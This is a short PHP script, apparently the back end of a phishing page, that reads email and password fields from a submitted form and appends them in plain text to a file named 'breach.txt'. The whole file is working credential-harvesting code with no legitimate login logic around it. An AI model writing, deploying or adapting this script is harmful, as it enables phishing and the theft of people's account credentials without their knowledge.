<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Open the file in append mode
    $file = fopen("breach.txt", "a");

    // Write the email and password to the file
    fwrite($file, "Email: " . $email . " | Password: " . $password . "\n");

    // Close the file
    fclose($file);
}
?>
